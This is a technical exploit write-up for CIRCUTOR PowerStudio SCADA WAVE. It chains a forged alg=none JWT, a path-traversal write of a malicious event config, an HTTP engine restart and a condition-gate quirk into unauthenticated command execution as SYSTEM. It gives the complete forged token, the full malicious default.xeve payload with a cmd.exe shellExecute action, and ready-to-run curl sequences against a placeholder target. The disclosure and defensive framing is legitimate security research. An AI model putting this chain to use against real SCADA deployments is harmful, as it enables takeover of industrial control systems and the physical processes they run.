# CIRCUTOR PowerStudio SCADA WAVE Unauthenticated shellExecute SYSTEM RCE - Technical Analysis

## Overview

CIRCUTOR PowerStudio SCADA WAVE 24.11.6.0 is a microservice-based SCADA platform whose native engine `PwrStudio.exe` runs as the Windows service `CircutorPowerStudioScadaServer` under `StartName=LocalSystem` (i.e. `NT AUTHORITY\SYSTEM`). The engine loads event configuration files (`*.xeve`) at startup; each event may carry a `<shellExecute>` action that is dispatched through `CreateProcessW` when the event activates. The full unauthenticated SYSTEM RCE chain combines four primitives across two microservices:

1. **VULN-002 — JWT `alg=none` authentication bypass**: the shared JWT Bearer authentication library (`PickData.MicroservicesShared.Infrastructure.Identity.IdentityExtensions.AddJWTBearerAuthentication`, referenced by every microservice's `Startup.ConfigureServices`) is configured fail-open — a custom `SignatureValidator` that always returns a non-null `JsonWebToken`, `RequireSignedTokens=false`, and an `OnAuthenticationFailed` handler that silently swallows exceptions. A forged `alg=none` JWT with `role=Admin` is accepted by every microservice's `AdminSecure` policy.
2. **Path-traversal write of `default.xeve`** via PSSWidgets (port 8105, `POST /api/storage/v1`, StorageSystem) using a forged `role=Admin.PSSWidgets` JWT — writes a malicious events config containing `<condition>1==1</condition>` and a `<shellExecute>` action to `C:\ProgramData\Circutor\PowerStudio Scada\Cfg\`.
3. **HTTP engine restart** via PSSAdministrator (port 8089, `PUT /api/engines/v1/{uuid}/stop|start`) using the forged `role=Admin` JWT — forces `PwrStudio.exe` to reload `default.xeve`.
4. **Condition-gate expression bypass**: the `1==1` expression causes `XCPolaca::GetType` to return 1 (the `==` operator token type 26 falls in the `[20,28]` range that maps to `edi=1`), passing the `LoadXml` `cmp eax,1` gate so the event enters the live list and `XCEventActionShellExecute::Execute` fires `CreateProcessW` as SYSTEM.

## Architecture

```
L1 external access: 8105 (PSSWidgets, IIS, all interfaces) / 8091 (PSSReverseProxy gateway, all interfaces) / 8089 (PSSAdministrator, HTTPS, default loopback)
L2 boundary: TLS (PSSAdministrator 8089 HTTPS) / plain HTTP (PSSWidgets 8105)
L3 gateway: PSSReverseProxy :8091 — routes to microservices
L4 auth: shared JWT Bearer (AddJWTBearerAuthentication) — AdminSecure/UserSecure policies per microservice
L5 business: PSSWidgets StorageController (file upload/download/delete/listdir) / PSSAdministrator EnginesController (engine stop/start)
L6 engine: PwrStudio.exe (native C++ PE32+) — CircutorPowerStudioScadaServer service, LocalSystem — loads *.xeve event configs, dispatches shellExecute via CreateProcessW
```

**Microservice layout**:

| Microservice | Port | Deployment | Account | Key controllers |
|--------------|------|------------|---------|-----------------|
| PSSAdministrator | 8089 (HTTPS) | standalone .exe | NT AUTHORITY\SYSTEM | EnginesController (engine stop/start), AdminController (microservice stop/start + config push), ForwardProxyController, RabbitMQController |
| PSSWidgets | 8105 / gateway 8091 | IIS in-process | PSSWidgetsAppPool (ApplicationPoolIdentity) | WidgetsStorageController (file upload/download/delete/listdir) |
| PSSEvents | 8101 | standalone .exe | service account | CommunicationSettingsController, EventsController |

All microservices call the same shared `AddJWTBearerAuthentication` extension in `Startup.ConfigureServices` — one misconfiguration defeats authentication across the entire product.

## Stage 1: VULN-002 — JWT `alg=none` Authentication Bypass (Auth-Bypass Primitive)

### 1.1 Shared authentication library (fail-open)

Reverse-engineered `PickData.MicroservicesShared.Infrastructure.Identity.IdentityExtensions.AddJWTBearerAuthentication`:

```csharp
public static void AddJWTBearerAuthentication(this IServiceCollection services, string authorityServer, bool requireHttps)
{
    services.AddAuthentication("Bearer").AddJwtBearer("Bearer", delegate(JwtBearerOptions options)
    {
        options.Authority = authorityServer;
        options.RequireHttpsMetadata = requireHttps;
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = false,                              // no issuer validation
            ValidateAudience = false,                            // no audience validation
            ValidateIssuerSigningKey = false,                    // no signing-key validation
            ClockSkew = TimeSpan.FromMinutes(5.0),
            NameClaimType = "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name",
            RoleClaimType = "http://schemas.microsoft.com/ws/2008/06/identity/claims/role",
            SignatureValidator = (string token, TokenValidationParameters parameters) =>
                new JsonWebToken(token),                         // custom validator: returns => accepted, no signature check
            RequireSignedTokens = false                          // accepts unsigned tokens (alg=none)
        };
        options.Events = new JwtBearerEvents
        {
            OnAuthenticationFailed = context =>
            {
                // only Console.WriteLine, no re-throw, returns Task.CompletedTask
                // authentication failures are silently swallowed, not propagated as hard failures
                return Task.CompletedTask;
            }
        };
    });
}
```

### 1.2 Key defect points

| Setting | Defect value | Nature |
|---------|--------------|--------|
| `ValidateIssuerSigningKey` | `false` | framework does not parse/validate the issuer signing key |
| `RequireSignedTokens` | `false` | allows unsigned tokens (`alg=none`) |
| `SignatureValidator` | `(token, params) => new JsonWebToken(token)` | **custom validator replaces built-in signature check** — returning a non-null `JsonWebToken` without throwing is treated as pass |
| `ValidateIssuer` | `false` | no issuer binding |
| `ValidateAudience` | `false` | no audience binding |
| `OnAuthenticationFailed` | swallows exceptions (log only) | authentication failures silently swallowed |

### 1.3 Why fail-open

ASP.NET Core JwtBearer's token validation flow: parse token → validate issuer → validate audience → validate lifetime → **validate signature**. When a custom `SignatureValidator` delegate is set, it **replaces** the built-in signature validation — the delegate returning a non-null `SecurityToken` is treated as signature pass, and not throwing means acceptance. The delegate here `(token, parameters) => new JsonWebToken(token)` **always returns a non-null `JsonWebToken` and never throws**, so signature validation is fully short-circuited, independent of signature content, key, or algorithm. Combined with `RequireSignedTokens=false`, `alg=none` (empty signature segment) tokens pass. `OnAuthenticationFailed` swallowing exceptions eliminates any accidental hard failure.

### 1.4 Forged token (F1)

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiQWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9.
```

- header: `{"typ":"JWT","alg":"none"}` (base64url `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0`)
- payload: `{"role":"Admin","exp":9999999999}` (base64url `eyJyb2xlIjoiQWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9`)
- signature segment: empty (`alg=none`)

### 1.5 Dynamic verification (401 → 200)

```bash
# No Authorization header:
curl -k -X PUT "https://127.0.0.1:8089/api/engines/v1/0B28DDCA-290D-4F53-A755-57C02A56DF93/stop"
# -> 401 Unauthorized

# Forged alg=none JWT (role=Admin):
curl -k -X PUT "https://127.0.0.1:8089/api/engines/v1/0B28DDCA-290D-4F53-A755-57C02A56DF93/stop" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiQWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9."
# -> 200 OK (engine stopped, PID disappears)
```

The same primitive is valid against PSSWidgets (8105) with a forged `role=Admin.PSSWidgetsManagement` claim — the shared library makes it the single trust root across all microservices.

## Stage 2: Path-Traversal Write of `default.xeve` (PSSWidgets 8105)

### 2.1 Sink — XCEventActionShellExecute::Execute

`XCEventActionShellExecute::Execute @ 0x180006f90` (XCEvents.dll) is the executor for the `shellExecute` event action. It calls `CreateProcessW` (with a `ShellExecuteW` fallback) constructing `"%ls %ls"` from the `<command>` and `<parameter>` elements. Because `PwrStudio.exe` runs as `NT AUTHORITY\SYSTEM`, the spawned process inherits SYSTEM privileges.

### 2.2 default.xeve schema

```xml
<event>
  <condition>1==1</condition>
  <actions>
    <activate>
      <shellExecute>
        <command>cmd.exe</command>
        <parameter>/c echo RCE_FIRED_EQEQ_20260721>C:\Windows\Temp\rce_proof.txt</parameter>
      </shellExecute>
    </activate>
  </actions>
</event>
```

### 2.3 Write path

The malicious `default.xeve` is written to `C:\ProgramData\Circutor\PowerStudio Scada\Cfg\default.xeve` via the PSSWidgets StorageSystem path-traversal sink (`POST /api/storage/v1` with a forged `role=Admin.PSSWidgets` JWT), or via any other local write path (shared config directory, operational workflow, etc.). The full payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<main>
  <eventsGroups>
    <eventsGroup>
      <id>6e7fea9c-c550-49a2-9147-4fc391d4d3be</id>
      <name>rcegroup</name>
    </eventsGroup>
  </eventsGroups>
  <events>
    <event>
      <id>cdfa8f97-b258-45ff-8330-e29135c9d724</id>
      <idn>rce</idn>
      <name>rce</name>
      <description>rce</description>
      <condition>1==1</condition>
      <actions>
        <activate>
          <shellExecute>
            <command>cmd.exe</command>
            <parameter>/c echo RCE_FIRED_EQEQ_20260721>C:\Windows\Temp\rce_proof.txt</parameter>
          </shellExecute>
        </activate>
      </actions>
    </event>
  </events>
</main>
```

## Stage 3: HTTP Engine Restart (PSSAdministrator 8089)

### 3.1 Engine reload trigger

PSSAdministratorMicroservice (8089 HTTPS, .NET Core) exposes:
- `PUT https://127.0.0.1:8089/api/engines/v1/{engineUuid}/stop`
- `PUT https://127.0.0.1:8089/api/engines/v1/{engineUuid}/start`

with `engineUuid = 0B28DDCA-290D-4F53-A755-57C02A56DF93`. The endpoints restart `PwrStudio.exe` through `System.ServiceProcess.ServiceController` (a real restart — the PID changes), causing the engine to reload `default.xeve` from the Cfg directory.

### 3.2 HTTP trigger sequence

```
PUT https://127.0.0.1:8089/api/engines/v1/0B28DDCA-290D-4F53-A755-57C02A56DF93/stop
   Authorization: Bearer <F1 JWT>
PUT https://127.0.0.1:8089/api/engines/v1/0B28DDCA-290D-4F53-A755-57C02A56DF93/start
   Authorization: Bearer <F1 JWT>
```

## Stage 4: Condition-Gate Expression Bypass (Data Flow)

### 4.1 Engine load path

- `XCEventServer::LoadCfg @ 0x18001f910` (XCEvents.dll): constructs path = CfgPath + "default" + ".xeve", calls `XCLoadEnabledEvents::Load(path, &xmlDoc)`.
- `XCLoadEnabledEvents::Load @ 0x180a82a0` (XCSupport.dll): event filter; keeps events whose `<disabled>` child != "T" (default "F", passes).
- `XCEventSystem::LoadXml @ 0x180028c20` (XCEvents.dll): constructs `XCEventDriver` → `LoadXml` → if FALSE the driver is destroyed and the event **does not enter the live list**.

### 4.2 XCEventDriver::LoadXml condition gate

`XCEventDriver::LoadXml @ 0x18000e470` (XCEvents.dll) parses id/idn/name/description/.../timeTable, then reads the `/condition` node @ `0x18000ea80` (NULL → return FALSE, condition is mandatory). The condition gate @ `0x18000eb2d-0x18000eb36`:

```
call AnalizeExpression()
cmp eax, 1
jne 0x18000e55f    ; return FALSE if != 1
```

### 4.3 XCEvaluator::AnalizeExpression

`XCEvaluator::AnalizeExpression @ 0x1804a7220` (XCDriverSupport.dll) is a tokenizer-based expression parser (XCPolaca RPN). On success it returns `XCPolaca::GetType()`, on failure -1.

### 4.4 XCPolaca::GetType — the gate decision

`XCPolaca::GetType @ 0x1804b2560` (XCDriverSupport.dll) takes the RPN stack-top token (imul 0x38 = sizeof token), reads the type field (token+0x50), computes `eax = type + 2`, and switches 39 cases @ `0x1804b262c`:
- **cases 22-30: `edi = 1` → return 1** (pass)
- i.e. **token.type ∈ [20,28] ⇒ GetType returns 1** (this is the condition for `LoadXml`'s `cmp eax,1` to pass)

### 4.5 XCTokenProducer::GetToken — token type mapping

`XCTokenProducer::GetToken @ 0x1804b1610` (XCDriverSupport.dll) is the tokenizer (92-case switch on input char). The token type field `[rdi+0x28]` assignment:

| Input | token type | type ∈ [20,28]? |
|-------|-----------|----------------|
| numeric constant `1` | 3 | no |
| `+` / `-` | 3 / 4 | no |
| `*` / `/` | 5 / 6 | no |
| `(` / `)` | 7 / 9 | no |
| `,` | 0x20 (32) | no |
| `==` | **0x1a (26)** | **yes** |
| `!=` | **0x1b (27)** | yes |
| `<` | **0x16 (22)** | yes |
| `<=` | **0x18 (24)** | yes |
| `>` | **0x17 (23)** | yes |
| `>=` | **0x19 (25)** | yes |
| `&&` | **0x1c (28)** | yes |
| `!` (logical not) | 0x1e (30) | no |

### 4.6 Key inference

- `<condition>1</condition>`: numeric constant token type=3, GetType returns 0 (3+2=5, not in cases 22-30) → **condition gate fails** → engine strips the `<condition>` node (confirmed via get.xml).
- `<condition>1==1</condition>`: the RPN stack-top token is the `==` operator (type 26), GetType returns 1 (26+2=28 ∈ cases 22-30 → edi=1) → **condition gate passes** → event enters the live list → `shellExecute` fires.

## Stage 5: Dynamic Verification

### 5.1 Engine restart confirmation

- Before restart: PID=<pid-before> (StartTime 14:06:11)
- After stop: PID disappears
- After start: PID=<pid-after> (StartTime 14:26:08) — new process, real restart confirmed

### 5.2 get.xml (condition retained = gate passed)

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<systemEvents>
  <id>FAECCAD7-1CE8-4F45-A368-9282163BAC09</id>
  <idEngine>FAECCAD7-1CE8-4F45-A368-9282163BAC09</idEngine>
  <eventsGroups><eventsGroup><id>6e7fea9c-c550-49a2-9147-4fc391d4d3be</id><name>rcegroup</name></eventsGroup></eventsGroups>
  <events><event>
    <id>cdfa8f97-b258-45ff-8330-e29135c9d724</id><idn>rce</idn><name>rce</name><description>rce</description>
    <condition>1==1</condition>   <!-- retained! previously <condition>1</condition> was stripped -->
    <actions><activate><shellExecute><command>cmd.exe</command>
    <parameter>/c echo RCE_FIRED_EQEQ_20260721&gt;C:\Windows\Temp\rce_proof.txt</parameter>
    </shellExecute></activate></actions>
  </event></events>
</systemEvents>
```

### 5.3 actived.xml (event activated)

```xml
<activedEvents><event>
  <id>EFFAAF97-B258-47FF-8330-E29135C9D724</id>
  <idn>EFFAAF97-B258-47FF-8330-E29135C9D724</idn>
  <name>rce</name><description>rce</description>
  <dateTime>21072026062608</dateTime>
  <notified>F</notified>
</event></activedEvents>
```

### 5.4 Marker file (SYSTEM write proof)

```
C:\Windows\Temp\rce_proof.txt
content: RCE_FIRED_EQEQ_20260721
Owner: BUILTIN\Administrators
ACL: NT AUTHORITY\SYSTEM FullControl, BUILTIN\Administrators FullControl
```

### 5.5 SYSTEM privilege confirmation

```
Service CircutorPowerStudioScadaServer: StartName=LocalSystem, State=Running, ProcessId=<pid-after>
tasklist: PwrStudio.exe <pid-after> Services ... NT AUTHORITY\SYSTEM
```

## Exploitation Prerequisites (Honest Disclosure)

The full unauthenticated SYSTEM RCE chain requires the attacker to reach **BOTH** microservices:

| Service | Port | Default binding | Required for |
|---------|------|-----------------|--------------|
| PSSWidgets | 8105 (gateway 8091) | all interfaces (remotely reachable) | path-traversal write of `default.xeve` |
| PSSAdministrator | 8089 | **127.0.0.1 loopback** (NOT remotely reachable by default) | HTTP engine restart that reloads `default.xeve` |

**8089 reachability** is the single network precondition. Port 8089 (PSSAdministrator) defaults to loopback. It is reachable only via one of:
1. A same-host reverse proxy / SSRF forwarding path (e.g. PSSReverseProxy on `:8091` or another microservice forwarding external requests to `127.0.0.1:8089`)
2. A same-host entry point (e.g. after gaining local execution via the 8105 write, then calling 8089 over loopback)
3. An operator rebind to a non-loopback address, or a reverse proxy exposing the admin plane externally
4. A same trusted network segment with the host firewall permitting 8089

**Under a strict default deployment (8089 loopback, no forwarding path) the chain breaks for a pure-remote unauthenticated attacker** — the written `default.xeve` is never loaded and `shellExecute` does not fire.

**License gate**: the dynamic verification was performed in a research environment without a valid CIRCUTOR license. In DEMO mode `isEventsResourcesAllowed` returns false and events are not loaded; to reproduce the `shellExecute` sink the researcher patched 5 license-gate binary bytes on disk and wrote `allowedResources.xcg` (events=999999). **This patch is a research reproduction aid, NOT an attack prerequisite.** In a licensed paid-customer deployment (the normal SCADA production posture) the engine runs in RELEASE mode, the 5 license gates already pass, and `allowedResources.xcg` quotas are sufficient — no binary modification is required. A companion license-activation audit established that HTTP cannot bypass the license (offline activation requires the vendor SOLO server signature, and the .NET PSSLicense layer is decoupled from the native engine license gate), so license patching is only achievable via local on-disk binary modification — outside the unauthenticated remote attacker's capability, but irrelevant for a licensed customer environment where the gate already passes.

| Scenario | Exploitable |
|----------|-------------|
| Licensed customer + 8089 reachable (reverse proxy / rebind / same-host / same segment) | Yes — unauthenticated remote SYSTEM RCE, full HTTP chain, no credentials, no binary modification |
| Licensed customer + 8089 strict loopback, no forwarding path | No — chain breaks at engine restart; `default.xeve` written but never loaded |
| Research environment (no license) + license-gate patch + 8089 reachable | Yes — reproduction (sink behavior identical once gate passes) |
| Research environment (no license), no patch | No — events not loaded in DEMO mode |

## Complete Attack Sequence (Licensed Customer + 8089 Reachable)

1. **Forge JWT**: construct `alg=none` JWT with `role=Admin` (no key, no signature) — the shared authentication library accepts it
2. **Write `default.xeve`**: via PSSWidgets (8105) `POST /api/storage/v1` path traversal with a forged `role=Admin.PSSWidgets` JWT, write the malicious events config (containing `<condition>1==1</condition>` + `<shellExecute>`) to `C:\ProgramData\Circutor\PowerStudio Scada\Cfg\default.xeve` — or via any other local write path
3. **Stop the engine**: `PUT https://<target>:8089/api/engines/v1/{uuid}/stop` with the forged `role=Admin` JWT — `PwrStudio.exe` stops (PID disappears)
4. **Start the engine**: `PUT https://<target>:8089/api/engines/v1/{uuid}/start` with the same JWT — `PwrStudio.exe` restarts (new PID), reloads `default.xeve`
5. **Condition gate**: `XCEventDriver::LoadXml` reads `<condition>1==1</condition>` → `AnalizeExpression("1==1")` → `==` token type 26 ∈ [20,28] → `XCPolaca::GetType` returns 1 → `cmp eax,1` passes → event enters the live list
6. **shellExecute fires**: the event loop activates the event → `XCEventActionShellExecute::Execute @ 0x180006f90` → `CreateProcessW(cmd.exe /c <attacker command>)` → **arbitrary command execution as `NT AUTHORITY\SYSTEM`**

## Reproduction Commands

### Licensed customer environment (valid license + 8089 reachable) — pure HTTP unauthenticated chain

```bash
# 0. Preconditions:
#    a) Target has a valid license activated (SCADA normal posture), engine RELEASE mode, license gate already passes
#    b) Attacker can reach 8089 PSSAdministrator (directly or via same-host forwarding)
# 1. Path-traversal write of default.xeve to Cfg directory via PSSWidgets (8105) with forged role=Admin.PSSWidgets JWT
#    (or any other local write path; default.xeve content per Stage 2.3)
# 2. HTTP engine restart (F1 JWT alg=none bypasses AdminSecure, hits 8089 PSSAdministrator):
curl -k -X PUT "https://<target>:8089/api/engines/v1/0B28DDCA-290D-4F53-A755-57C02A56DF93/stop" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiQWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9."
sleep 4
curl -k -X PUT "https://<target>:8089/api/engines/v1/0B28DDCA-290D-4F53-A755-57C02A56DF93/start" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiQWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9."
sleep 15
# 3. Verify marker (written by SYSTEM):
type C:\Windows\Temp\rce_proof.txt
# Output: RCE_FIRED_EQEQ_20260721
```

### Research environment (no license) — reproduction method

```bash
# 0. Preconditions: research environment has no license; patch 5 license gates on disk + write allowedResources.xcg first (research reproduction aid, not an attack prerequisite)
# 1. Write default.xeve to C:\ProgramData\Circutor\PowerStudio Scada\Cfg\default.xeve (per Stage 2.3)
# 2. HTTP engine restart:
curl -k -X PUT "https://127.0.0.1:8089/api/engines/v1/0B28DDCA-290D-4F53-A755-57C02A56DF93/stop" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiQWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9."
sleep 4
curl -k -X PUT "https://127.0.0.1:8089/api/engines/v1/0B28DDCA-290D-4F53-A755-57C02A56DF93/start" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiQWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9."
sleep 15
# 3. Verify marker:
type C:\Windows\Temp\rce_proof.txt
# Output: RCE_FIRED_EQEQ_20260721
```

The full automation script is at `exploit/circutor_powerstudio_shellExecute_rce.py` (Python standard library only). The script defaults to the research environment (includes the license-patch precondition); in a licensed customer environment skip the license-patch step (the gate already passes).

## Key Technical Insights

1. **Shared authentication trust root**: one fail-open `AddJWTBearerAuthentication` configuration is referenced by every microservice — a single `alg=none` forged JWT defeats `AdminSecure`/`UserSecure` across the entire product (VULN-002). This is the auth-bypass primitive that makes the 8105 write and the 8089 restart both unauthenticated.

2. **Two-microservice chain**: 8105 writes the payload, 8089 triggers the reload. Neither alone yields RCE — the chain only closes when both ports are reachable. The 8089 loopback default is the honest caveat that prevents a clean default-config 9.8.

3. **Condition-gate expression quirk**: the `XCPolaca::GetType` switch maps token types `[20,28]` (comparison/logical operators) to `return 1`, while numeric constants (type 3) map to `return 0`. `<condition>1==1</condition>` leaves the `==` operator on the RPN stack top, passing the gate; `<condition>1</condition>` leaves a numeric constant, failing it. A subtle evaluator-internal property becomes the difference between a stripped condition and a fired `shellExecute`.

4. **Engine as SYSTEM**: `PwrStudio.exe` runs as `LocalSystem`, so `XCEventActionShellExecute::Execute` → `CreateProcessW` inherits `NT AUTHORITY\SYSTEM`. The `shellExecute` event action is an extremely high-risk primitive that should be disabled by default, allowlisted, and never run under LocalSystem.

5. **License gate is a research-only caveat, not an attack precondition**: the real exploitable environment is a licensed paid-customer deployment where the gate already passes. The research-environment binary patch is a reproduction aid equivalent to "assume the target is a licensed customer."

## Credits

Discovered by 0day Rubbish Project using automated AI vulnerability research with multi-LLM ensemble (Claude, OpenAI, DeepSeek, GLM).

---

*Disclaimer: This research was conducted for defensive purposes. Always obtain proper authorization before testing systems you don't own. Responsible disclosure practices apply.*
